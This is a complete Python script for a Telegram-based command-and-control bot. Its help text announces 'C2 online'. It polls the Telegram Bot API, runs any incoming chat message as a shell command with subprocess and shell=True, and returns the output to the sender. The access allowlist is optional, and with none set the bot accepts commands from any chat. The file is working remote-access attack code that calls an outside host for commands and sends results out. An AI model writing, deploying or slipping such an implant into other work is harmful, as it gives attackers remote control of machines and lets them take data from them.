#!/usr/bin/env python3
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TOKEN = os.environ.get("TG_TOKEN", "").strip()
API = "https://api.telegram.org/bot{}/".format(TOKEN)
ALLOWED = os.environ.get("TG_ALLOW", "").strip()
TIMEOUT = int(os.environ.get("TG_TIMEOUT", "60"))
CWD = os.environ.get("TG_CWD") or os.getcwd()
MAX_OUT = 4000

HELP = (
    "C2 online.\n"
    "kol message = commande shell\n"
    "/cwd  - current dir\n"
    "/ping - liveness\n"
    "/help - help"
)


def api(method, params=None, timeout=90):
    url = API + method
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())


def send(chat_id, text):
    text = text if text else "(empty)"
    for i in range(0, len(text), MAX_OUT):
        chunk = text[i:i + MAX_OUT]
        try:
            api("sendMessage", {"chat_id": chat_id, "text": chunk})
        except Exception as e:
            print("send failed: {}".format(e), file=sys.stderr)


def shell(cmd):
    global CWD
    cmd = cmd.strip()
    if not cmd:
        return ""
    if cmd.split()[0] == "cd":
        parts = cmd.split(None, 1)
        target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
        target = os.path.expanduser(target)
        if not os.path.isabs(target):
            target = os.path.join(CWD, target)
        target = os.path.abspath(target)
        if not os.path.isdir(target):
            return "cd: no such directory: {}".format(target)
        CWD = target
        return CWD
    try:
        p = subprocess.run(cmd, shell=True, cwd=CWD, capture_output=True,
                           text=True, errors="replace", timeout=TIMEOUT)
    except subprocess.TimeoutExpired:
        return "timeout after {}s".format(TIMEOUT)
    except OSError as e:
        return "exec error: {}".format(e)
    out = (p.stdout or "") + (p.stderr or "")
    if not out:
        out = "(no output, rc={})".format(p.returncode)
    elif p.returncode != 0:
        out += "\n[rc={}]".format(p.returncode)
    return out


def main():
    if not TOKEN:
        sys.exit("TG_TOKEN env var missing")
    try:
        me = api("getMe")
    except urllib.error.HTTPError as e:
        sys.exit("Telegram auth failed: HTTP {}".format(e.code))
    print("[+] bot: @{}".format(me["result"]["username"]))
    if ALLOWED:
        print("[+] allowlist: {}".format(ALLOWED))
    else:
        print("[!] no TG_ALLOW set - accepting any chat")
    offset = 0
    while True:
        try:
            upd = api("getUpdates", {"offset": offset, "timeout": 50}, timeout=70)
        except (urllib.error.URLError, OSError, ValueError) as e:
            print("[!] poll error: {}".format(e), file=sys.stderr)
            time.sleep(3)
            continue
        for u in upd.get("result", []):
            offset = u["update_id"] + 1
            m = u.get("message") or {}
            chat = (m.get("chat") or {}).get("id")
            text = (m.get("text") or "").strip()
            if chat is None or not text:
                continue
            if ALLOWED and str(chat) != ALLOWED:
                print("[!] drop chat {}".format(chat))
                continue
            print("[>] {} : {}".format(chat, text))
            if text in ("/start", "/help"):
                send(chat, HELP)
                continue
            if text == "/ping":
                send(chat, "pong")
                continue
            if text == "/cwd":
                send(chat, CWD)
                continue
            if text.startswith("/"):
                send(chat, "unknown command, /help")
                continue
            try:
                api("sendChatAction", {"chat_id": chat, "action": "typing"})
            except Exception:
                pass
            out = shell(text)
            print("[<] {}".format(out[:300].replace("\n", " | ")))
            send(chat, out)


if __name__ == "__main__":
    main()
